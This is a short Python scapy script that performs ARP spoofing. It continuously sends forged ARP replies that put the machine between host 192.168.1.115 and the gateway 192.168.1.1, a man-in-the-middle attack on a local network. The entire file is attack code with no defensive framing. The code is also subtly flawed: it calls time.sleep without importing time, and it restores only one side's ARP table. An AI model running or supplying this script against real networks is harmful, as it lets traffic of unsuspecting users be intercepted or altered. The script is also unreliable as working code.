#!/usr/bin/env python3

import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 2, verbose =False)[0]
    
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet,verbose=False)

    

sent_packets_count = 0
try:
    while True:
        spoof("192.168.1.115", "192.168.1.1")
        spoof("192.168.1.1", "192.168.1.115")
        sent_packets_count += 2
        print("\r[+] sent",sent_packets_count ,"packets",end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Quitting")
    restore("192.168.1.115","192.168.1.1")
